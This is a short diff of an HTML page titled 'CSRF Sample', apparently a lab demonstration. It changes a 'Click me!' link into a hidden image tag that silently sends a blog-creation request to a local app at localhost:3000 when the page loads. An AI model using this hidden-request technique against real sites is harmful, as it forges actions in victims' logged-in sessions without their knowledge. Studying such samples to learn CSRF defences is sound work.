@@ -10,9 +10,7 @@
 
 <body>
   <h1>CSRF Sample</h1>
-  <a href='http://localhost:3000/blogs/create?blog[title]=hello&blog[body]=CSRF'>
-    <img src='./test.jpg' height=100><br>
-    Click me!
-  </a>
+  <img src='./test.jpg' height=100><br>
+  <img src='http://localhost:3000/blogs/create?blog[title]=hello&blog[body]=CSRF' style='display: none;'>
 </body>
 </html>
